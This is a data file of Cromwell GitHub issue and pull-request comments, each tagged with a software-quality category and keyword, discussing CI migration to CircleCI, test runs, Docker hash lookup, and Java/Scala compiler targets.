https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-763891981:100,Performance,race condition,race condition,100,"Looks like Chris has suggested some substantial changes, will wait to review when those land (avoid race condition)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-763891981
https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-763891981:94,Safety,avoid,avoid,94,"Looks like Chris has suggested some substantial changes, will wait to review when those land (avoid race condition)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-763891981
https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-765110157:38,Testability,test,tests,38,@aednichols @cjllanwarne I have added tests for the new implementation of `flatten` method. Requesting re-reviews,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6158#issuecomment-765110157
https://github.com/broadinstitute/cromwell/pull/6160#issuecomment-764008813:9,Deployability,Update,Updated,9,@kshakir Updated the release doc with instruction for generating a commit list and adding the output to the release ticket.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6160#issuecomment-764008813
https://github.com/broadinstitute/cromwell/pull/6160#issuecomment-764008813:21,Deployability,release,release,21,@kshakir Updated the release doc with instruction for generating a commit list and adding the output to the release ticket.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6160#issuecomment-764008813
https://github.com/broadinstitute/cromwell/pull/6160#issuecomment-764008813:108,Deployability,release,release,108,@kshakir Updated the release doc with instruction for generating a commit list and adding the output to the release ticket.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6160#issuecomment-764008813
https://github.com/broadinstitute/cromwell/pull/6169#issuecomment-777841131:58,Modifiability,config,config,58,Manually rebased onto `develop` to address missing circle config,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6169#issuecomment-777841131
https://github.com/broadinstitute/cromwell/issues/6172#issuecomment-782111450:211,Deployability,install,installed,211,"I am experiencing a similar issue. Due to private AWS ECR registries not being supported, the hash lookup would not work with the remote hash lookup which was causing call-caching to not work. To bypass this, I installed a Docker CLI on the Cromwell server and enabled the local lookup, but this library/ prefix kept being added. I was able to patch it by modifying `dockerHashing/src/main/scala/cromwell/docker/local/DockerCliFlow.scala`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6172#issuecomment-782111450
https://github.com/broadinstitute/cromwell/issues/6172#issuecomment-782111450:344,Deployability,patch,patch,344,"I am experiencing a similar issue. Due to private AWS ECR registries not being supported, the hash lookup would not work with the remote hash lookup which was causing call-caching to not work. To bypass this, I installed a Docker CLI on the Cromwell server and enabled the local lookup, but this library/ prefix kept being added. I was able to patch it by modifying `dockerHashing/src/main/scala/cromwell/docker/local/DockerCliFlow.scala`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6172#issuecomment-782111450
https://github.com/broadinstitute/cromwell/issues/6172#issuecomment-782111450:94,Security,hash,hash,94,"I am experiencing a similar issue. Due to private AWS ECR registries not being supported, the hash lookup would not work with the remote hash lookup which was causing call-caching to not work. To bypass this, I installed a Docker CLI on the Cromwell server and enabled the local lookup, but this library/ prefix kept being added. I was able to patch it by modifying `dockerHashing/src/main/scala/cromwell/docker/local/DockerCliFlow.scala`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6172#issuecomment-782111450
https://github.com/broadinstitute/cromwell/issues/6172#issuecomment-782111450:137,Security,hash,hash,137,"I am experiencing a similar issue. Due to private AWS ECR registries not being supported, the hash lookup would not work with the remote hash lookup which was causing call-caching to not work. To bypass this, I installed a Docker CLI on the Cromwell server and enabled the local lookup, but this library/ prefix kept being added. I was able to patch it by modifying `dockerHashing/src/main/scala/cromwell/docker/local/DockerCliFlow.scala`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6172#issuecomment-782111450
https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772769434:198,Deployability,integrat,integration,198,"Since I'm already here: you may find that ""documentation only"" changes don't receive the same full CI suite that other more codey changes get, so just something to be aware of if you're testing the integration tests...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772769434
https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772769434:198,Integrability,integrat,integration,198,"Since I'm already here: you may find that ""documentation only"" changes don't receive the same full CI suite that other more codey changes get, so just something to be aware of if you're testing the integration tests...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772769434
https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772769434:186,Testability,test,testing,186,"Since I'm already here: you may find that ""documentation only"" changes don't receive the same full CI suite that other more codey changes get, so just something to be aware of if you're testing the integration tests...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772769434
https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772769434:210,Testability,test,tests,210,"Since I'm already here: you may find that ""documentation only"" changes don't receive the same full CI suite that other more codey changes get, so just something to be aware of if you're testing the integration tests...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772769434
https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772843310:44,Testability,test,tests,44,"Hmm... on closer look it looks like all the tests did run (because you have a `Pull Request` build and it ran more than just the `sbt` test suite. Which probably means our ""only light testing for doc changes"" logic is slightly inaccurate, but I think for this PR... it means you should be fine.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772843310
https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772843310:135,Testability,test,test,135,"Hmm... on closer look it looks like all the tests did run (because you have a `Pull Request` build and it ran more than just the `sbt` test suite. Which probably means our ""only light testing for doc changes"" logic is slightly inaccurate, but I think for this PR... it means you should be fine.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772843310
https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772843310:184,Testability,test,testing,184,"Hmm... on closer look it looks like all the tests did run (because you have a `Pull Request` build and it ran more than just the `sbt` test suite. Which probably means our ""only light testing for doc changes"" logic is slightly inaccurate, but I think for this PR... it means you should be fine.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772843310
https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772843310:209,Testability,log,logic,209,"Hmm... on closer look it looks like all the tests did run (because you have a `Pull Request` build and it ran more than just the `sbt` test suite. Which probably means our ""only light testing for doc changes"" logic is slightly inaccurate, but I think for this PR... it means you should be fine.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6175#issuecomment-772843310
https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775277475:45,Integrability,message,message,45,NB you can also use `[force ci]` in a commit message to avoid having to create multiple PRs just to see tests run,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775277475
https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775277475:56,Safety,avoid,avoid,56,NB you can also use `[force ci]` in a commit message to avoid having to create multiple PRs just to see tests run,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775277475
https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775277475:104,Testability,test,tests,104,NB you can also use `[force ci]` in a commit message to avoid having to create multiple PRs just to see tests run,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775277475
https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775479208:52,Performance,throughput,throughput,52,@cjllanwarne I'm using multiple PRs to increase the throughput of data gathering.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775479208
https://github.com/broadinstitute/cromwell/pull/6181#issuecomment-776199989:118,Deployability,pipeline,pipelines,118,"In most cases, the `-branch` build has a significantly shorter runtime than the `-pr` build: https://app.circleci.com/pipelines/github/broadinstitute/cromwell/367/workflows/7b1a2a51-80b7-432a-b883-4c28c15741d4. Is the `-branch` build doing the right thing?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6181#issuecomment-776199989
https://github.com/broadinstitute/cromwell/pull/6181#issuecomment-776210901:120,Deployability,pipeline,pipelines,120,"> In most cases, the `-branch` build has a significantly shorter runtime than the `-pr` build: https://app.circleci.com/pipelines/github/broadinstitute/cromwell/367/workflows/7b1a2a51-80b7-432a-b883-4c28c15741d4. Is the `-branch` build doing the right thing?. Yes, it mimics current behaviour we have for Travis - for branch builds we actually only run sbt tests and other tests just succeed fast without actually running anything, unless there's a `[force ci]` in the commit message",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6181#issuecomment-776210901
https://github.com/broadinstitute/cromwell/pull/6181#issuecomment-776210901:476,Integrability,message,message,476,"> In most cases, the `-branch` build has a significantly shorter runtime than the `-pr` build: https://app.circleci.com/pipelines/github/broadinstitute/cromwell/367/workflows/7b1a2a51-80b7-432a-b883-4c28c15741d4. Is the `-branch` build doing the right thing?. Yes, it mimics current behaviour we have for Travis - for branch builds we actually only run sbt tests and other tests just succeed fast without actually running anything, unless there's a `[force ci]` in the commit message",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6181#issuecomment-776210901
https://github.com/broadinstitute/cromwell/pull/6181#issuecomment-776210901:357,Testability,test,tests,357,"> In most cases, the `-branch` build has a significantly shorter runtime than the `-pr` build: https://app.circleci.com/pipelines/github/broadinstitute/cromwell/367/workflows/7b1a2a51-80b7-432a-b883-4c28c15741d4. Is the `-branch` build doing the right thing?. Yes, it mimics current behaviour we have for Travis - for branch builds we actually only run sbt tests and other tests just succeed fast without actually running anything, unless there's a `[force ci]` in the commit message",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6181#issuecomment-776210901
https://github.com/broadinstitute/cromwell/pull/6181#issuecomment-776210901:373,Testability,test,tests,373,"> In most cases, the `-branch` build has a significantly shorter runtime than the `-pr` build: https://app.circleci.com/pipelines/github/broadinstitute/cromwell/367/workflows/7b1a2a51-80b7-432a-b883-4c28c15741d4. Is the `-branch` build doing the right thing?. Yes, it mimics current behaviour we have for Travis - for branch builds we actually only run sbt tests and other tests just succeed fast without actually running anything, unless there's a `[force ci]` in the commit message",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6181#issuecomment-776210901
https://github.com/broadinstitute/cromwell/issues/6182#issuecomment-774772321:124,Performance,perform,perform,124,"Hey @bolton-lab, just FYI this is probably more of a WDL forum sort of thing. But generally, you've noted you don't want to perform execution where your inputs are localised to, if you need to mutate or reuse them, you should copy them to your execution folder by adding a copy in your command block together with the `basename` function, eg:. ```wdl; # task index {; command {; set -e -o pipefail; cp ~{bam} ~{basename(bam)}; /opt/samtools/bin/samtools index ~{basename(bam)} ~{basename(bam)}.bai; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6182#issuecomment-774772321
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777799687:172,Deployability,configurat,configuration-reference,172,I noticed we don't get test details in CircleCI. We might be able to if we configure `store_test_results` with `centaur/target/test-reports`: https://circleci.com/docs/2.0/configuration-reference/#store_test_results,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777799687
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777799687:75,Modifiability,config,configure,75,I noticed we don't get test details in CircleCI. We might be able to if we configure `store_test_results` with `centaur/target/test-reports`: https://circleci.com/docs/2.0/configuration-reference/#store_test_results,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777799687
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777799687:172,Modifiability,config,configuration-reference,172,I noticed we don't get test details in CircleCI. We might be able to if we configure `store_test_results` with `centaur/target/test-reports`: https://circleci.com/docs/2.0/configuration-reference/#store_test_results,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777799687
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777799687:23,Testability,test,test,23,I noticed we don't get test details in CircleCI. We might be able to if we configure `store_test_results` with `centaur/target/test-reports`: https://circleci.com/docs/2.0/configuration-reference/#store_test_results,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777799687
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777799687:127,Testability,test,test-reports,127,I noticed we don't get test details in CircleCI. We might be able to if we configure `store_test_results` with `centaur/target/test-reports`: https://circleci.com/docs/2.0/configuration-reference/#store_test_results,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777799687
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432:47,Availability,failure,failures,47,"A couple of other observations:; 1. Re-running failures seems to be better with CircleCI. If you click through to the details, you can invoke ""Rerun Workflow from Failed"" to skip re-running tests that succeeded.; 2. We currently have the Travis PR build marked as Required in GitHub. Circle has each test suite split out into its own check. This is great if we want finer control over which tests must pass before merging. This is not so great if we want all PR test suites to succeed because we have to do extra maintenance in GitHub as we add/remove test suites.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432:513,Availability,mainten,maintenance,513,"A couple of other observations:; 1. Re-running failures seems to be better with CircleCI. If you click through to the details, you can invoke ""Rerun Workflow from Failed"" to skip re-running tests that succeeded.; 2. We currently have the Travis PR build marked as Required in GitHub. Circle has each test suite split out into its own check. This is great if we want finer control over which tests must pass before merging. This is not so great if we want all PR test suites to succeed because we have to do extra maintenance in GitHub as we add/remove test suites.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432:190,Testability,test,tests,190,"A couple of other observations:; 1. Re-running failures seems to be better with CircleCI. If you click through to the details, you can invoke ""Rerun Workflow from Failed"" to skip re-running tests that succeeded.; 2. We currently have the Travis PR build marked as Required in GitHub. Circle has each test suite split out into its own check. This is great if we want finer control over which tests must pass before merging. This is not so great if we want all PR test suites to succeed because we have to do extra maintenance in GitHub as we add/remove test suites.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432:300,Testability,test,test,300,"A couple of other observations:; 1. Re-running failures seems to be better with CircleCI. If you click through to the details, you can invoke ""Rerun Workflow from Failed"" to skip re-running tests that succeeded.; 2. We currently have the Travis PR build marked as Required in GitHub. Circle has each test suite split out into its own check. This is great if we want finer control over which tests must pass before merging. This is not so great if we want all PR test suites to succeed because we have to do extra maintenance in GitHub as we add/remove test suites.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432:391,Testability,test,tests,391,"A couple of other observations:; 1. Re-running failures seems to be better with CircleCI. If you click through to the details, you can invoke ""Rerun Workflow from Failed"" to skip re-running tests that succeeded.; 2. We currently have the Travis PR build marked as Required in GitHub. Circle has each test suite split out into its own check. This is great if we want finer control over which tests must pass before merging. This is not so great if we want all PR test suites to succeed because we have to do extra maintenance in GitHub as we add/remove test suites.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432:462,Testability,test,test,462,"A couple of other observations:; 1. Re-running failures seems to be better with CircleCI. If you click through to the details, you can invoke ""Rerun Workflow from Failed"" to skip re-running tests that succeeded.; 2. We currently have the Travis PR build marked as Required in GitHub. Circle has each test suite split out into its own check. This is great if we want finer control over which tests must pass before merging. This is not so great if we want all PR test suites to succeed because we have to do extra maintenance in GitHub as we add/remove test suites.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432:552,Testability,test,test,552,"A couple of other observations:; 1. Re-running failures seems to be better with CircleCI. If you click through to the details, you can invoke ""Rerun Workflow from Failed"" to skip re-running tests that succeeded.; 2. We currently have the Travis PR build marked as Required in GitHub. Circle has each test suite split out into its own check. This is great if we want finer control over which tests must pass before merging. This is not so great if we want all PR test suites to succeed because we have to do extra maintenance in GitHub as we add/remove test suites.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777811432
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295:174,Deployability,configurat,configuration-reference,174,> I noticed we don't get test details in CircleCI. We might be able to if we configure `store_test_results` with `centaur/target/test-reports`: https://circleci.com/docs/2.0/configuration-reference/#store_test_results. I think we also don't have this for Travis. This would be nice to have as a separate ticket.; https://broadworkbench.atlassian.net/browse/BT-138,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295:77,Modifiability,config,configure,77,> I noticed we don't get test details in CircleCI. We might be able to if we configure `store_test_results` with `centaur/target/test-reports`: https://circleci.com/docs/2.0/configuration-reference/#store_test_results. I think we also don't have this for Travis. This would be nice to have as a separate ticket.; https://broadworkbench.atlassian.net/browse/BT-138,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295:174,Modifiability,config,configuration-reference,174,> I noticed we don't get test details in CircleCI. We might be able to if we configure `store_test_results` with `centaur/target/test-reports`: https://circleci.com/docs/2.0/configuration-reference/#store_test_results. I think we also don't have this for Travis. This would be nice to have as a separate ticket.; https://broadworkbench.atlassian.net/browse/BT-138,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295:25,Testability,test,test,25,> I noticed we don't get test details in CircleCI. We might be able to if we configure `store_test_results` with `centaur/target/test-reports`: https://circleci.com/docs/2.0/configuration-reference/#store_test_results. I think we also don't have this for Travis. This would be nice to have as a separate ticket.; https://broadworkbench.atlassian.net/browse/BT-138,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295:129,Testability,test,test-reports,129,> I noticed we don't get test details in CircleCI. We might be able to if we configure `store_test_results` with `centaur/target/test-reports`: https://circleci.com/docs/2.0/configuration-reference/#store_test_results. I think we also don't have this for Travis. This would be nice to have as a separate ticket.; https://broadworkbench.atlassian.net/browse/BT-138,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778286564:55,Availability,failure,failures,55,"> A couple of other observations:; > ; > 1. Re-running failures seems to be better with CircleCI. If you click through to the details, you can invoke ""Rerun Workflow from Failed"" to skip re-running tests that succeeded. I like that a bit less, since in Travis, if one of the subbuilds failed after 1 second, you can independently restart it immediately. But in CircleCI you would need to wait for all subbuilds to finish in order for it to let you restart the failed onces.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778286564
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778286564:198,Testability,test,tests,198,"> A couple of other observations:; > ; > 1. Re-running failures seems to be better with CircleCI. If you click through to the details, you can invoke ""Rerun Workflow from Failed"" to skip re-running tests that succeeded. I like that a bit less, since in Travis, if one of the subbuilds failed after 1 second, you can independently restart it immediately. But in CircleCI you would need to wait for all subbuilds to finish in order for it to let you restart the failed onces.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778286564
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778422533:81,Deployability,pipeline,pipelines,81,"Tests succeeded, but Github failed to acknowledge that: https://app.circleci.com/pipelines/github/broadinstitute/cromwell/409/workflows/3271b73b-439b-4666-b7dd-08e8fb8ae99c. Most likely because I enabled full CircleCI integration with Github after creating this PR. Will need to check if it works fine for subsequent PRs",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778422533
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778422533:218,Deployability,integrat,integration,218,"Tests succeeded, but Github failed to acknowledge that: https://app.circleci.com/pipelines/github/broadinstitute/cromwell/409/workflows/3271b73b-439b-4666-b7dd-08e8fb8ae99c. Most likely because I enabled full CircleCI integration with Github after creating this PR. Will need to check if it works fine for subsequent PRs",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778422533
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778422533:218,Integrability,integrat,integration,218,"Tests succeeded, but Github failed to acknowledge that: https://app.circleci.com/pipelines/github/broadinstitute/cromwell/409/workflows/3271b73b-439b-4666-b7dd-08e8fb8ae99c. Most likely because I enabled full CircleCI integration with Github after creating this PR. Will need to check if it works fine for subsequent PRs",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778422533
https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778422533:0,Testability,Test,Tests,0,"Tests succeeded, but Github failed to acknowledge that: https://app.circleci.com/pipelines/github/broadinstitute/cromwell/409/workflows/3271b73b-439b-4666-b7dd-08e8fb8ae99c. Most likely because I enabled full CircleCI integration with Github after creating this PR. Will need to check if it works fine for subsequent PRs",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-778422533
https://github.com/broadinstitute/cromwell/issues/6188#issuecomment-796893864:188,Availability,avail,available,188,"If this is alignment to the human genome reference, each aligning job will require ~8GB of RAM. If you have 10 jobs running concurrently you would want to make sure there are ~80Gb of RAM available. Alternatively, with CallCaching active, you can just re-run the workflow until all tasks have succeeded.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6188#issuecomment-796893864
https://github.com/broadinstitute/cromwell/issues/6188#issuecomment-796893864:124,Performance,concurren,concurrently,124,"If this is alignment to the human genome reference, each aligning job will require ~8GB of RAM. If you have 10 jobs running concurrently you would want to make sure there are ~80Gb of RAM available. Alternatively, with CallCaching active, you can just re-run the workflow until all tasks have succeeded.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6188#issuecomment-796893864
https://github.com/broadinstitute/cromwell/pull/6194#issuecomment-808338591:1157,Deployability,release,release,1157,"Re:. > what of this?. Where I think this was [this](https://github.com/broadinstitute/cromwell/blob/develop/project/Settings.scala#L50) (same line but in 59). Via the scala compiler options linked below:. ```; -target:TARGET or --target:TARGET; Target platform for object files. ([8],9,10,11,12). Default: 8; ```. I'm guessing `1.8` worked for backwards compatibility just like the `1.x` synonyms mentioned in the `javac` docs later below. For consistency like the original rawls PR I removed the explicit `--target` setting. But according to the `scalac` docs that just means Rawls, Cromwell, etc. are still just emitting Java 8 bytecode from `.scala` files. Rawls also explicitly sets the `javac` options. Cromwell doesn't. The latest version of this PR did not make the `javac` options explicitly consistent between the two projects. Instead, Cromwell is consistent in that it does NOT specify the target bytecode for `scalac` nor `javac`. I did review the SBT docs, plus the java docs for the last community LTS (11) and the current (16) `javac`. Unlike `scalac` using `8`, from my understanding of the docs, not specifying `--source` / `--target` / `--release` implicitly means use ""the current Java SE release"". So Rawls, Cromwell, and others should be emitting Java 11 bytecode from `.java` files. - https://github.com/broadinstitute/rawls/pull/1372/files#diff-b0608ed4fcebc8b5aa969f0c92dc9809e860d963b04e73affd55bb51e4fd10a1L18-L27; - https://docs.scala-lang.org/overviews/compiler-options/index.html; - https://www.scala-sbt.org/1.x/docs/Java-Sources.html; - https://docs.oracle.com/en/java/javase/16/docs/specs/man/javac.html; - https://docs.oracle.com/en/java/javase/11/tools/javac.html",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6194#issuecomment-808338591
https://github.com/broadinstitute/cromwell/pull/6194#issuecomment-808338591:1208,Deployability,release,release,1208,"Re:. > what of this?. Where I think this was [this](https://github.com/broadinstitute/cromwell/blob/develop/project/Settings.scala#L50) (same line but in 59). Via the scala compiler options linked below:. ```; -target:TARGET or --target:TARGET; Target platform for object files. ([8],9,10,11,12). Default: 8; ```. I'm guessing `1.8` worked for backwards compatibility just like the `1.x` synonyms mentioned in the `javac` docs later below. For consistency like the original rawls PR I removed the explicit `--target` setting. But according to the `scalac` docs that just means Rawls, Cromwell, etc. are still just emitting Java 8 bytecode from `.scala` files. Rawls also explicitly sets the `javac` options. Cromwell doesn't. The latest version of this PR did not make the `javac` options explicitly consistent between the two projects. Instead, Cromwell is consistent in that it does NOT specify the target bytecode for `scalac` nor `javac`. I did review the SBT docs, plus the java docs for the last community LTS (11) and the current (16) `javac`. Unlike `scalac` using `8`, from my understanding of the docs, not specifying `--source` / `--target` / `--release` implicitly means use ""the current Java SE release"". So Rawls, Cromwell, and others should be emitting Java 11 bytecode from `.java` files. - https://github.com/broadinstitute/rawls/pull/1372/files#diff-b0608ed4fcebc8b5aa969f0c92dc9809e860d963b04e73affd55bb51e4fd10a1L18-L27; - https://docs.scala-lang.org/overviews/compiler-options/index.html; - https://www.scala-sbt.org/1.x/docs/Java-Sources.html; - https://docs.oracle.com/en/java/javase/16/docs/specs/man/javac.html; - 